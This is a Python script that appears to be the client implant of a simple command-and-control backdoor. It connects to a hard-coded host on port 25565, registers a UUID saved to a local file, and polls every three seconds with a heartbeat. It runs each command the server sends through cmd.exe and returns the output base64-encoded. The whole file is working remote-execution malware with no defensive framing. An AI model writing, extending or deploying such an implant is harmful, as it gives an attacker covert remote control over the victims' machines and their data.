import socket
import time
from os.path import exists
import subprocess
from base64 import b64encode

# client will start by checking if the uuid exists
# if not:
#   assume new connection, send new-uuid, save output (somewhere)
# else:
#   read in uuid, call set-uuid
# loop over heartbeat
# do heartbeat
HOST = "127.0.0.1"
HOST = "10.100.234.202"

def set_uuid(s, UUID):
    msg = 'set-uuid\n'.encode()
    print(msg)
    s.sendall(msg)
    msg = UUID.encode() + b'\n'
    print(msg)
    s.sendall(msg)

def new_uuid(s):
    msg = 'new-uuid\n'.encode()
    print(msg)
    s.sendall(msg)

    uuid = s.recv(1024).decode().strip()
    with open('my_uuid.txt', 'w') as f:
        f.write(uuid)

def heartbeat(s):
    msg = 'heartbeat\n'.encode()
    print(msg)
    s.sendall(msg)
    cmd = s.recv(1024).decode().strip()
    if cmd != "None":
        cmd = cmd.split(' ')
        print(cmd)

        result = subprocess.Popen(["cmd.exe", "/c"] + cmd, stdout=subprocess.PIPE)
        stdout = result.communicate()
        if len(stdout[0]) > 0:
            msg = b64encode(stdout[0]) + "\n".encode()
        else:
            msg = b64encode(b'Success') + "\n".encode()
            print(msg)
        s.sendall(msg)

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, 25565))
        s.settimeout(10)

        # TODO: change to a temp directory? 
        if exists('my_uuid.txt'):
            with open('my_uuid.txt', 'r') as f:
                UUID = f.read().strip()
            set_uuid(s, UUID)
        else:
            new_uuid(s)
            # print(UUID)

        #heartbeat loop
        while True:
            time.sleep(3)
            heartbeat(s)


if __name__ == '__main__':
    main()